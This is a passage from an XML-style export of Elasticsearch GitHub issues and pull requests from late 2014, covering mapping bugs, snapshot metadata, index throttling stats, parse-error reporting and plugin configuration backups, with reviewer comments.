</description><key id="44099297">7902</key><summary>Posting a mapping with default analyzer fails</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">nwarz</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T19:44:30Z</created><updated>2015-06-07T18:36:57Z</updated><resolved>2014-11-14T10:19:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-10-10T13:51:12Z" id="58658001">@nwarz Thanks for the PR. I made a left a small comment but otherwise it's looking good
</comment><comment author="colings86" created="2014-11-14T10:07:57Z" id="63036412">pushed to master in https://github.com/elasticsearch/elasticsearch/commit/e77f9720d2fb74afb5ce82b3ad7d75d21a00e74f

pushed to 1.x in https://github.com/elasticsearch/elasticsearch/commit/6e98bd73b43079847f0143c6ddf77b26ff441f55
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow custom metadata to specify whether or not it should be in a snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7901</link><project id="" key="" /><description>Before this change all persistent custom metadata is stored as part of snapshot. It requires us to remove repositories metadata later during recovery process. This change allows custom metadata to specify whether or not it should be stored as part of a snapshot.

  Fixes #7900
</description><key id="44095707">7901</key><summary>Allow custom metadata to specify whether or not it should be in a snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:Snapshot/Restore</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T19:04:22Z</created><updated>2015-06-07T17:28:55Z</updated><resolved>2014-09-30T16:00:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-09-26T19:24:11Z" id="57008646">+1 to this feature, LGTM; tests looks good, not really familiar with Snapshot/Restore code though.
</comment><comment author="s1monw" created="2014-09-29T07:28:35Z" id="57125425">left some comments
</comment><comment author="imotov" created="2014-09-29T13:37:49Z" id="57161303">@s1monw @kimchy Thanks for the review. I pushed an update.
</comment><comment author="kimchy" created="2014-09-29T17:34:46Z" id="57197684">LGTM
</comment><comment author="s1monw" created="2014-09-30T12:51:52Z" id="57308410">LGTM I think this can go in to 1.4.0Beta1
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshot/Restore: Allow custom metadata to specify whether or not it should be in a snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7900</link><project id="" key="" /><description /><key id="44095563">7900</key><summary>Snapshot/Restore: Allow custom metadata to specify whether or not it should be in a snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels /><created>2014-09-26T19:02:47Z</created><updated>2014-09-30T16:00:35Z</updated><resolved>2014-09-30T16:00:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>implement / endpoint without using cluster state</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7899</link><project id="" key="" /><description>The / endpoint is currently using cluster state to return its response.  it may be better to get this information from the node info and/or define some new action to return this data.
</description><key id="44080725">7899</key><summary>implement / endpoint without using cluster state</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kevinkluge</reporter><labels /><created>2014-09-26T16:30:25Z</created><updated>2014-09-30T14:58:56Z</updated><resolved>2014-09-30T14:58:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Replace `percent_terms_to_match` with `minimum_should_match`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7898</link><project id="" key="" /><description>The minimum number of optional should clauses of the generated query to match
can now be set using the more extensive minimum should match syntax. This
makes the `percent_terms_to_match` parameter deprecated, and replaced in favor
to a new `minimum_should_match` parameter.
</description><key id="44068381">7898</key><summary>Replace `percent_terms_to_match` with `minimum_should_match`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:More Like This</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T14:37:16Z</created><updated>2015-06-07T10:58:29Z</updated><resolved>2014-09-29T09:25:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-26T20:33:25Z" id="57016542">Looks great! LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>"filter" :  { ... },</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7897</link><project id="" key="" /><description>The ending braces.
</description><key id="44055809">7897</key><summary>"filter" :  { ... },</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">Sohair63</reporter><labels><label>docs</label></labels><created>2014-09-26T12:31:56Z</created><updated>2014-10-14T11:27:21Z</updated><resolved>2014-10-14T11:27:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T17:39:39Z" id="57352036">Hi @Sohair63 

Thanks for the fix. Please could I ask you to sign the CLA so that I can merge it in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-10-14T11:27:21Z" id="59028038">Closed by #7888 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add time in index throttle to index stats.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7896</link><project id="" key="" /><description>This PR adds the time spent throttling indexing to a single thread to the stats API.

Closes #7861
</description><key id="44054011">7896</key><summary>Add time in index throttle to index stats.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>:Stats</label><label>enhancement</label><label>release highlight</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T12:13:40Z</created><updated>2015-06-07T17:35:03Z</updated><resolved>2014-10-22T13:19:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-26T15:49:39Z" id="56980069">I think docs need to be updated, and we need some sort of test case?
</comment><comment author="s1monw" created="2014-09-26T21:15:30Z" id="57021460">I left some comments - this PR needs some more work IMO
</comment><comment author="GaelTadh" created="2014-09-29T10:59:10Z" id="57145201">@s1monw I've moved the timing into a TimedLock. @mikemccand we still create a throttle on start and flush. I don't want to change behavior when just adding some timing information. Perhaps a different PR for that.
</comment><comment author="kimchy" created="2014-09-29T11:05:43Z" id="57145790">I was actually thinking of implementing it slightly differently. I was thinking of adding additional callbacks to `ShardIndexingService`, something like `#beforeThrottling` and `#afterThrottling`. 

Then, we can keep the relevant stats on `ShardIndexingService`, and add it to the more appropriate place (compared to SegmentsStats) which is `IndexingStats`.
</comment><comment author="kimchy" created="2014-09-29T11:08:25Z" id="57146030">also, I think that we should have 2 stats, the first is `is_throttled` which is true or false, and the second is the time spent throttling.
</comment><comment author="mikemccand" created="2014-09-29T13:35:04Z" id="57160923">&gt; I don't want to change behavior when just adding some timing information.

OK makes sense.
</comment><comment author="GaelTadh" created="2014-09-29T14:24:13Z" id="57168095">@kimchy Do you want to add the callbacks at the same place we emit the log message ? I think @s1monw's point is that we are not actually throttling until the throttle lock has been acquired, we are just in a state where we may throttle. 
</comment><comment author="kimchy" created="2014-09-30T14:37:15Z" id="57323508">We can put the callback after or before, I personally don't think its as important (missing a millisecond here or there, and now that the method is sync'ed, its simpler to reason). @s1monw what do you think about the idea of callback and adding it to indexing stats?
</comment><comment author="s1monw" created="2014-09-30T14:45:05Z" id="57324814">yeah I agree we can just use a callback - I wonder what info we need here do we want the time we spend indexing under the throttle or the time the index throttle was active? I think these are 2 different impls?
</comment><comment author="GaelTadh" created="2014-10-02T10:15:54Z" id="57608931">@s1monw @kimchy I'm happy to do either one or both ? To be clear the time we spend under the throttle [1] is the time the lock was acquired (the current implementation in this PR) and the time the throttle was active [2] is the time between the two log messages. 

For [1] are we ok making a callback from within a lock acquire and release ? 
</comment><comment author="s1monw" created="2014-10-14T14:22:03Z" id="59052444">@kimchy can you comment on my latest comment
</comment><comment author="kimchy" created="2014-10-14T14:26:52Z" id="59053349">I think the most important time is the period index throttle was active (much simpler to reason about when comparing it to other rate type graphs)

I would just do the callback when throttling gets enbed, and a callback when it gets disabled. 

The indexing stats service can then keep track of the time. 

The throttling stats would include the time spent while in throttling mode, and a false/true if it's in throttle mode. Both of those can be easily handled by the callbacks on the indexing stats service
</comment><comment author="GaelTadh" created="2014-10-14T14:28:57Z" id="59053738">Ok sounds good, thanks I'll implement the call back at the time between the two log messages. 
</comment><comment author="GaelTadh" created="2014-10-22T11:20:48Z" id="60069892">I've made the changes and added new tests.
</comment><comment author="s1monw" created="2014-10-22T12:08:30Z" id="60074793">left some comments
</comment><comment author="s1monw" created="2014-10-22T13:04:32Z" id="60080873">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>scroll() api big `size` number throws timeout</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7895</link><project id="" key="" /><description>Although the [scroll docs](http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/scan-scroll.html) example has a `size` parameter set to `1000`, I get a timeout on queries with size bigger than `10`. 

Any ideas why?
</description><key id="44052041">7895</key><summary>scroll() api big `size` number throws timeout</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">teckays</reporter><labels /><created>2014-09-26T11:53:51Z</created><updated>2014-10-02T10:16:01Z</updated><resolved>2014-09-30T17:38:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T17:38:42Z" id="57351879">@stalbe not with the information that you have provided :)  It sounds like you are doing something wrong, and the right place to ask for advice about what the problem is, is the user forum.
</comment><comment author="teckays" created="2014-10-02T10:16:01Z" id="57608944">@clintongormley the code is OK, I have checked it in the #elasticsearch irc channel with one of your contributors, the problem may lie in the docs count in the type (11m), could be that there are too many documents and that's why `search` and even `scroll` api both throw a timeout error. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update id-field.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7894</link><project id="" key="" /><description>It is strange to provide an example with `"store" : false` when talking about possibility of enabling the field to be stored.
Broke the line in the mapping in two lines for better readability.
Made a sentence above the mapping more verbose.
</description><key id="44046529">7894</key><summary>Update id-field.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">golubev</reporter><labels><label>Awaiting CLA</label><label>docs</label></labels><created>2014-09-26T10:59:04Z</created><updated>2014-10-17T15:17:58Z</updated><resolved>2014-10-17T13:18:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T17:37:11Z" id="57351649">Hi @golubev 

Looks good. Thanks for the PR. Could I ask you to sign the CLA so that I can merge this in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="golubev" created="2014-09-30T17:41:20Z" id="57352297">Hi @clintongormley 

We've signed the CCLA (company "LUN UA LLC"), listing me as a contributor.
</comment><comment author="clintongormley" created="2014-10-16T18:54:25Z" id="59411336">Hi @golubev 

Just checked, and we need you to sign the personal CLA as well please.  Sorry for the bother, and thanks
</comment><comment author="golubev" created="2014-10-17T08:27:56Z" id="59482564">Hello, @clintongormley 

That's OK! I have just signed the ICCLA providing my current github username.
</comment><comment author="clintongormley" created="2014-10-17T13:17:57Z" id="59510863">thanks @golubev - merged
</comment><comment author="golubev" created="2014-10-17T15:17:57Z" id="59528292">Thanks, @clintongormley !
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Cancelling a recovery may leave temporary files behind</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7893</link><project id="" key="" /><description>We currently cancel recoveries when the shard is no longer assigned to the target node, or the primary shard (source of copying) is moved to another node (and there are more scenarios).  That cancel logic doesn't clean up any temporary files created during the recovery.

Normally that's not a problem as the files will be cleaned up once the shard is safely recovered somewhere else (or locally). However, if one runs into continuous failure cycles we can fill up disk space, causing bigger problems like corrupting other shards on the node.
</description><key id="44040665">7893</key><summary>Resiliency: Cancelling a recovery may leave temporary files behind</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>bug</label><label>resiliency</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T10:07:27Z</created><updated>2014-11-03T12:01:03Z</updated><resolved>2014-11-03T12:01:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-11-03T12:01:03Z" id="61468594">fixed with #8092 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indices API: fixes GET Alias API backwards compatibility</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7892</link><project id="" key="" /><description>For just the case when only the aliases are requested, the default indices options are to ignore missing indexes. When requesting any other feature or any combination of features, the default will be to error on missing indices.

Closes #7793
</description><key id="44035087">7892</key><summary>Indices API: fixes GET Alias API backwards compatibility</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Index APIs</label><label>blocker</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label></labels><created>2014-09-26T09:28:25Z</created><updated>2015-03-19T17:39:56Z</updated><resolved>2014-09-30T08:58:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-30T08:37:55Z" id="57283008">I think we test this different behaviour for aliases already in the REST tests right? Shall we also add a small java test for it? Apart from that LGTM!
</comment><comment author="javanna" created="2014-09-30T08:55:47Z" id="57284954">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cleaner query parse error feedback</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7891</link><project id="" key="" /><description>Provides the line and column number in user input where errors were spotted and a succinct parse error message, free of server-side stack trace info.

Many "*parser" classes are changed but the core framework changes are:

1) XContentParser can now return a new "XContentLocation" object describing position of last token parsed
2) Existing SearchParseException and QueryParsingException classes have all constructors changed to take an XContentLocation object to encourage supply of detailed parse feedback
3) Common "UserInputException" interface introduced for exceptions relating to user input (the 2 above).
4) SearchPhaseExecutionException that gathers results from many shards holds onto only the first of several (typically duplicate) UserInputExceptions from shards
5) BytesRestResponse outputs extra JSON fields for parse failures including line, column and succinct error message.

Closes #3303
</description><key id="44034953">7891</key><summary>Cleaner query parse error feedback</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>:Exceptions</label></labels><created>2014-09-26T09:27:31Z</created><updated>2015-04-28T08:09:25Z</updated><resolved>2015-04-28T08:09:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markharwood" created="2014-09-26T09:31:20Z" id="56939518">Example reponse

![sense](https://cloud.githubusercontent.com/assets/170925/4418446/ca6d9aca-455f-11e4-99a6-b4dd8162469f.jpg)
</comment><comment author="markharwood" created="2014-09-26T09:53:51Z" id="56941684">Note: I have not validated that all of the parsers are reporting the correct token positions for all the errors they throw - this change is a first step towards improving error reporting by providing the framework for more detailed feedback and ensuring all classes comply with these changed APIs. 
We may need more work on improving the accuracy of the error reporting produced by the parsers to make sure line/col positions are correct.
</comment><comment author="eliasah" created="2014-09-26T09:59:43Z" id="56942217">Eventually a more readable formatted message will be good. The message errors are very hard to read sometimes since it's all packed 
</comment><comment author="s1monw" created="2014-09-26T20:36:30Z" id="57016920">this looks great mark, can we have some testcases for this as well? I also wonder if we can design this a little more generic, it seems like it's only really supported on a search request / response. One thing I can think of is to implement `ToXContent` on the exception and transport the source exception across the wire and the check in the rest response if the exception (the unwrapped) implements it and serialize it to the user?
</comment><comment author="markharwood" created="2014-09-29T08:57:52Z" id="57133366">Will add test case.
As for making generic, the current behaviour is to take only the first shard response that reports an error with the user's input and we return the related information in the rest response. 
`ToXContent` feels like a good way of generically dumping info but is perhaps too generic for indicating a problem with user input. Maybe change the existing UserInputException to this..

```
public interface UserInputException extends ToXContent, Serializable { } 
```
</comment><comment author="markharwood" created="2014-09-30T11:09:02Z" id="57297870">@s1monw This gets a little messy with mixes of serialization approaches. 

From what I can see search parse exceptions are returned using regular Java serialization from data nodes. Java clients and REST endpoints can report back the embedded parse error details just fine for single searches.
So far so good, but ShardSearchFailure also implements the Streamable API which only looks to be used when reporting deleteByQuery or multiSearch type bulk operations. If we wanted to propagate these parser error details onto bulk responses I'd need to either: 
a) call Java Serialization functions on these exceptions to create byte arrays that I then write to StreamOutput during ShardSearchFailure.writeTo() calls.
b) call toXContent and capture the explanation e.g. as a Json string that can then be re-parsed
c) force the exceptions to implement Streamable

Right now ShardSearchFailure looks to have a policy of simplifying errors in its constructor rather than retaining full `cause` traceability of exceptions - it gets some primitive values (status code, string description , shard id) and only writes these when called via Streamable. 

Do you want the parser failure explanations to propagate out in full to these bulk APIs too and if so what is your preference for the various serialization options I outlined?
</comment><comment author="markharwood" created="2014-09-30T14:03:52Z" id="57318194">Going with a variant of b) above.
</comment><comment author="markharwood" created="2014-10-01T16:03:40Z" id="57489912">Made more generic - new interface OptionalXContentHolder provides the common interface for exceptions (e.g. SearchParseException) or other types of object (e.g. ShardSearchFailure) which can sometimes contain additional information that is useful to pass back in client responses. The "hasContent" method indicates if there is any feedback that needs passing back in responses
</comment><comment author="s1monw" created="2014-10-07T11:31:17Z" id="58170702">@markharwood I like this, yet I don't undestand why we need the extra interface `OptionalXContentHolder` why can't we just use `ToXContent` and if it has no xcontent it's simply and impl detail for each of the exceptions?
</comment><comment author="s1monw" created="2014-10-10T19:35:52Z" id="58705553">I just took another tour of this and I think we have to solve this differently. The way this is implemented doesn't really work since we are not bound to one kind of XContent there are multiple of them and we don't know at the place where the exception occurs which XContent type the response uses. That said IMO XContent is not the way to serialise over the network within ES. I think it's fine for rending back to the user but not across the wire. Yet, I think we can come up with a set of `ErrorMessages` like
- `ParseErrorMessage`
- `GenericErrorMessage`
- `InsufficientMemoryErrorMessage` (for Circ. Breakers)
  where all of them implement `Streamable` and `ToXContent`. We can then implement some utilies that allow use to deserialize this type via Streamable. Not sure if that gets messy though
</comment><comment author="markharwood" created="2014-10-11T17:16:52Z" id="58757023">&gt; IMO XContent is not the way to serialise over the network within ES

It seemed a little crazy to expect these exception objects to support 3 different forms of serialization (Streamable, toXContent and Serializable). 
Java.io.Serializable is justifiable if you expect Java clients to be able to root around with getCause() type calls to discover and cast specific types of error but for all the REST clients the need for Streamable can be avoided if you can simply call toXContent to get a byte array that can be streamed and then re-played as your choice of XContent format using XContentHelper.writeDirect() on those bytes. Using an XContent format that has field-names with the data also overcomes the version sensitivities that plagues the other serialization formats that rely on strict value sequences and lengths.
I appreciate xContent may not be as lean-and-mean as the other serialization formats but there are 2 factors that could make it justifiable in this case: 
1. We are talking about using it here only for transporting exception messages, which should be the rare case and is likely to be significantly smaller than the JSON that otherwise accompanies a successful query response.
2.  There is no need for the receiving end to deserialize any specialized implementations  - this is not like an agg reducer object that has to perform some specialized logic on the received data for it to be useful.
</comment><comment author="s1monw" created="2014-10-13T11:21:51Z" id="58878877">I think I misread the impl of `XContentHelper.writeDirect` sorry about the confusion... lemme review it again
</comment><comment author="markharwood" created="2014-10-17T08:35:40Z" id="59483387">Related https://github.com/elasticsearch/elasticsearch/issues/3145
</comment><comment author="markharwood" created="2014-11-07T14:14:13Z" id="62149714">Rebased on latest master
</comment><comment author="s1monw" created="2015-04-24T07:45:20Z" id="95837110">@markharwood given the transport layer improvements etc. in https://github.com/elastic/elasticsearch/pull/10643 do you think you can rebase this one?
</comment><comment author="markharwood" created="2015-04-24T10:32:53Z" id="95884662">Will do 
</comment><comment author="javanna" created="2015-04-28T08:09:24Z" id="96968091">Superseded by #10837 I think. Closing.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Don't overwrite plugin configuration when removing/upgrading plugins</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7890</link><project id="" key="" /><description>When removing and installing again the plugin all configuration files will be removed in `config/pluginname` dir.
This is bad as users may have set and added specific configuration files.

We don't have yet an upgrade command which could handle this nicely.

So we remove that code for now and we will implement an upgrade method in another PR.

Related to  #5064.
</description><key id="44032557">7890</key><summary>Don't overwrite plugin configuration when removing/upgrading plugins</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Plugins</label><label>breaking</label><label>enhancement</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T09:11:47Z</created><updated>2015-06-06T17:41:48Z</updated><resolved>2014-10-07T14:19:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-27T10:38:23Z" id="57048889">@pickypg PR updated based on your comments. So we now backup `config/pluginname` to `config/pluginname.backup`, then we remove `config/pluginname` and install the plugin file content.

It means that after removing and installing again the plugin, users will have to copy thei files from `config/pluginname.backup` to `config/pluginname`. Checking manually what they need to copy.

There still an issue. If you have already installed, remove and reinstall the plugin, you have created a `config/pluginname.backup`. If you remove and install again, it fails today as the backup directory already exists.
(A PR update is ready with a test which fails in that case).

I think we should remove the old backup directory before backup.

Also I was wondering if making a backup should not be part of the removal process instead of the install process. I think it makes more sense to backup data when we remove the plugin.

WDYT? cc @uboness 
</comment><comment author="pickypg" created="2014-09-27T19:19:38Z" id="57062795">I'm personally more fond of this approach because I think it's clearer how to get it working again.

I'm trying to think through the two proposed versions:
- Add in place and do not change existing files
  - Works best for users that do not change anything (no files floating around)
  - Moderately annoying, but not necessarily confusing when the config changes and the updated plugin fails because of the existing config, which could be completely unchanged from the prior release
  - Most confusing when changes have been made _and_ other files are added
    - Particularly true if multiple plugin versions have been skipped and changes are not immediately obvious
  - Works most similarly to Elasticsearch
- Backup existing config and replace with new
  - Works worst when nothing changes, but the existing config had been changed (forcing users to copy them back)
  - No risk of failure if no changes were made and the update adds changes (wasted file copy).
  - Less confusing when mixing updates with new files; still requires a copy _if_ the once-existing file now has missing changes, but it makes it easier to merge them
  - Easiest to merge
  - Works differently from Elasticsearch, but does not presume that plugins are setup with proper defaults like Elasticsearch

I wonder if we should have some sort of a "force" where it skips any backups/checks and simply overwrites (the true shortcut to delete, then install).

&gt; There still an issue ... I think we should remove the old backup directory before backup.

My only fear with this approach is that users will think something got screwed up, then retry the upgrade. In doing so, they would delete the real backup.

Assuming we maintain this approach: if an existing backup still exists, then I wonder if we should force the user to delete it?

&gt; Also I was wondering if making a backup should not be part of the removal process instead of the install process. I think it makes more sense to backup data when we remove the plugin.

If someone goes through the process of removing a plugin, then I think it's their fault to not backup their config.
